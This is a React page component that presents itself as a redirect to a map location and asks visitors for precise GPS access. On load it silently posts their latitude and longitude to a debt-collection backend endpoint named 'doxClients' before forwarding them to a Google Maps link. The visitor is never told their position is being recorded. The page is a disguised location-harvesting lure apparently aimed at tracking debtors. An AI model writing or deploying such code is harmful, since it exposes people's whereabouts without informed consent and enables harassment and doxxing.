
import { useEffect, useRef, useState } from "react";
import axios from "../src/api/axiosConfig";

const REDIRECT_URL = "https://maps.app.goo.gl/1LwgK8Jr1zL15NKJ7";
const SESSION_KEY = "doxClientSubmissionStarted";

export default function App() {
  const executed = useRef(false);
  const redirectTimer = useRef(null);
  const countdownTimer = useRef(null);

  const [status, setStatus] = useState("Cargando solicitud...");
  const [error, setError] = useState(false);
  const [seconds, setSeconds] = useState(5);
  const [loading, setLoading] = useState(false);
  const [permissionDenied, setPermissionDenied] = useState(false);
  const [showRetry, setShowRetry] = useState(false);

  const createDoxClient = async (data) => {
    const response = await axios.post(
      "https://sistema-de-cobranza-meraz-back.onrender.com/api/core/doxClients",
      data
    );

    return response.data;
  };

  const clearTimers = () => {
    if (redirectTimer.current) {
      window.clearTimeout(redirectTimer.current);
      redirectTimer.current = null;
    }

    if (countdownTimer.current) {
      window.clearInterval(countdownTimer.current);
      countdownTimer.current = null;
    }
  };

  const redirect = () => {
    clearTimers();

    setLoading(true);
    setSeconds(5);
    setError(false);
    setShowRetry(false);
    setStatus("Redirigiendo a la ubicación...");

    countdownTimer.current = window.setInterval(() => {
      setSeconds((prev) => {
        if (prev <= 1) {
          window.clearInterval(countdownTimer.current);
          countdownTimer.current = null;
          return 0;
        }

        return prev - 1;
      });
    }, 1000);

    redirectTimer.current = window.setTimeout(() => {
      window.location.replace(REDIRECT_URL);
    }, 3000);
  };

  const registerLocation = async () => {
    setPermissionDenied(false);
    setShowRetry(false);
    setError(false);
    setLoading(false);
    setStatus("Solicitando permisos de GPS...");

    if (!navigator.geolocation) {
      setError(true);
      setShowRetry(true);
      setStatus("Tu navegador no admite la geolocalización.");
      return;
    }

    try {
      const position = await new Promise((resolve, reject) => {
        navigator.geolocation.getCurrentPosition(
          resolve,
          reject,
          {
            enableHighAccuracy: true,
            timeout: 20000,
            maximumAge: 0,
          }
        );
      });

      const data = {
        latitude: position.coords.latitude,
        longitude: position.coords.longitude,
      };

      setStatus("Cargando...");

      await createDoxClient(data);

      sessionStorage.setItem(SESSION_KEY, "completed");

      redirect();
    } catch (err) {

      setError(true);
      setShowRetry(true);
      setLoading(false);

      if (err.code === 1) {
        setPermissionDenied(true);
        setStatus("Necesitas permitir el acceso a tu ubicación.");
      } else if (err.code === 2) {
        setStatus("Activa el GPS e inténtalo de nuevo.");
      } else if (err.code === 3) {
        setStatus("La solicitud de ubicación tardó demasiado. Inténtalo de nuevo.");
      } else {
        setStatus("No se pudo completar el proceso. Inténtalo de nuevo.");
      }
    }
  };

  useEffect(() => {
    if (executed.current) return;
    executed.current = true;

    if (sessionStorage.getItem(SESSION_KEY) === "completed") {
      redirect();
    } else {
      registerLocation();
    }

    return () => {
      clearTimers();
    };
  }, []);

  return (
    <main style={styles.page}>
      <style>{`
        @keyframes spin {
          to { transform: rotate(360deg); }
        }

        @keyframes appear {
          from { opacity: 0; transform: translateY(12px); }
          to { opacity: 1; transform: translateY(0); }
        }

        @keyframes progress {
          from { transform: scaleX(0); }
          to { transform: scaleX(1); }
        }

        @media (max-width: 480px) {
          .redirect-card {
            padding: 30px 22px !important;
          }
        }

        @media (prefers-reduced-motion: reduce) {
          .spinner, .progress-bar, .redirect-card {
            animation: none !important;
          }
        }
      `}</style>

      <section className="redirect-card" style={styles.card}>
        <div style={styles.logoContainer}>
          <img
            src="/logo.jpeg"
            alt="Icono de la aplicación"
            style={styles.logo}
          />
        </div>

        <h1 style={styles.title}>Redireccionando a la ubicación</h1>

        <p style={styles.description}>
          Mantén activa la ubicación GPS y concede los permisos necesarios
          para continuar.
        </p>

        <div
          role="status"
          aria-live="polite"
          style={{
            ...styles.status,
            ...(error ? styles.errorStatus : {}),
          }}
        >
          {!error && <span style={styles.spinner} />}
          <span>{status}</span>
        </div>

        {permissionDenied && (
          <div style={styles.permissionHelp}>
            <p style={styles.helpText}>
              Si seleccionaste «Bloquear», abre los permisos de este sitio
              en tu navegador, cambia la ubicación a «Permitir» y vuelve
              a intentarlo.
            </p>
          </div>
        )}

        {showRetry && (
          <button
            onClick={registerLocation}
            style={styles.retryButton}
          >
            Volver a intentar
          </button>
        )}

        {loading && (
          <>
            <div style={styles.progressTrack}>
              <div
                key="progress"
                className="progress-bar"
                style={styles.progressBar}
              />
            </div>

            <p style={styles.countdown}>
              Continuando en <strong>{seconds}</strong> segundos
            </p>
          </>
        )}

        <p style={styles.footer}>
          Puedes mantener esta ventana abierta mientras completamos el proceso.
        </p>
      </section>
    </main>
  );
}

const styles = {
  page: {
    minHeight: "100vh",
    display: "flex",
    alignItems: "center",
    justifyContent: "center",
    padding: 24,
    background:
      "radial-gradient(circle at top left, #e0e7ff 0, transparent 45%), linear-gradient(135deg, #f8fafc, #eef2ff)",
    fontFamily:
      "Inter, system-ui, -apple-system, BlinkMacSystemFont, Segoe UI, sans-serif",
    boxSizing: "border-box",
  },

  card: {
    width: "100%",
    maxWidth: 440,
    padding: "40px 32px",
    textAlign: "center",
    background: "rgba(255,255,255,0.96)",
    border: "1px solid #e2e8f0",
    borderRadius: 24,
    boxShadow: "0 24px 70px rgba(30,41,59,0.12)",
    animation: "appear 0.5s ease-out",
    boxSizing: "border-box",
  },

  logoContainer: {
    width: 100,
    height: 100,
    margin: "0 auto 24px",
    display: "grid",
    placeItems: "center",
    borderRadius: 26,
    background: "#eef2ff",
  },

  logo: {
    width: 84,
    height: 84,
    objectFit: "contain",
    borderRadius: 18,
  },

  title: {
    margin: "0 0 12px",
    color: "#172554",
    fontSize: "clamp(23px, 5vw, 29px)",
    lineHeight: 1.25,
  },

  description: {
    margin: "0 auto 28px",
    color: "#64748b",
    fontSize: 15,
    lineHeight: 1.7,
  },

  status: {
    minHeight: 48,
    display: "flex",
    alignItems: "center",
    justifyContent: "center",
    gap: 12,
    padding: 12,
    borderRadius: 12,
    background: "#f8fafc",
    color: "#334155",
    fontSize: 14,
    lineHeight: 1.5,
  },

  errorStatus: {
    background: "#fff1f2",
    color: "#be123c",
  },

  spinner: {
    flexShrink: 0,
    width: 19,
    height: 19,
    border: "2px solid #c7d2fe",
    borderTopColor: "#4338ca",
    borderRadius: "50%",
    animation: "spin 0.8s linear infinite",
  },

  permissionHelp: {
    marginTop: 16,
    padding: 12,
    borderRadius: 12,
    background: "#fff7ed",
  },

  helpText: {
    margin: 0,
    color: "#9a3412",
    fontSize: 13,
    lineHeight: 1.6,
  },

  retryButton: {
    marginTop: 18,
    padding: "12px 20px",
    border: "none",
    borderRadius: 10,
    background: "#4f46e5",
    color: "#ffffff",
    cursor: "pointer",
    fontSize: 15,
    fontWeight: 600,
  },

  progressTrack: {
    height: 6,
    marginTop: 28,
    overflow: "hidden",
    borderRadius: 99,
    background: "#e2e8f0",
  },

  progressBar: {
    width: "100%",
    height: "100%",
    borderRadius: 99,
    background: "linear-gradient(90deg, #4f46e5, #818cf8)",
    transformOrigin: "left",
    animation: "progress 5s linear forwards",
  },

  countdown: {
    margin: "18px 0 0",
    color: "#64748b",
    fontSize: 14,
  },

  footer: {
    margin: "24px 0 0",
    color: "#94a3b8",
    fontSize: 12,
    lineHeight: 1.6,
  },
};